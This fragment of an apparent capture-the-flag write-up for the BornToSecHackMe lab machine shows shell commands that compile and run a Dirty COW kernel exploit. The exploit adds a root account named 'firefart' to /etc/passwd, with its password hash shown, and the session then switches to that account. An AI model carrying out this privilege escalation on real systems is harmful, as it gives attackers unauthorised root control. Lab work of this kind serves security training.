...
```
laurie@BornToSecHackMe:/var/crash# ./DirtyScan.sh 
...
```
laurie@BornToSecHackMe:/var/crash$ gcc dirty.c -pthread -lcrypt -o dirty
laurie@BornToSecHackMe:/var/crash$ ./dirty
...
```
laurie@BornToSecHackMe:/var/crash$ cat /etc/passwd
firefart:fiRbwOlRgkx7g:0:0:pwned:/root:/bin/bash
```
...
```
laurie@BornToSecHackMe:/var/crash$ su firefart
Password: 
